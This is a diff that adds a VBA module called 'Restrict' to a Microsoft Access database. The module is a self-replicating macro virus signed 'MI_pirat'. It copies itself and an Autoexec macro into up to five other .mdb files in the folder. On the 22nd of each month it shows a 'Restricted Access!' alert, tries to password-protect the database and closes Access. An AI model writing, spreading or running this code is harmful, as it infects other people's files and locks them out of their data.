@@ -1,0 +1,29 @@
+   Attribute VB_Name = "Restrict"
+   Option Compare Database
+   Option Explicit
+   Function GOx()
+   'RESTRICTED ACCESS by MI_pirat
+   '<2001> Year of the Great Virus
+   On Error Resume Next
+   Dim infData, i, mDir, modul, inf, nr, zi
+   mDir = Dir("*.mdb", vbDirectory)
+   While (mDir <> "") And (i < 5)
+   i = i + 1
+   For Each modul In Application.Modules
+   If Modules.Item(nr).Name = "Restrict" Then inf = inf + 1
+   nr = nr + 1
+   Next modul
+   infData = mDir
+   If inf = 0 Then
+   DoCmd.TransferDatabase acExport, "Microsoft Access", infData, acMacro, "Autoexec", "Autoexec"
+   DoCmd.TransferDatabase acExport, "Microsoft Access", infData, acModule, "Restrict", "Restrict"
+   End If
+   mDir = Dir
+   Wend
+   zi = Day(Date)
+   If zi = 22 Then
+   MsgBox "Restricted-Access on your PC", vbCritical, "Restricted Access!"
+   infData.NewPassword "", "ra"
+   Application.Quit
+   End If
+   End Function
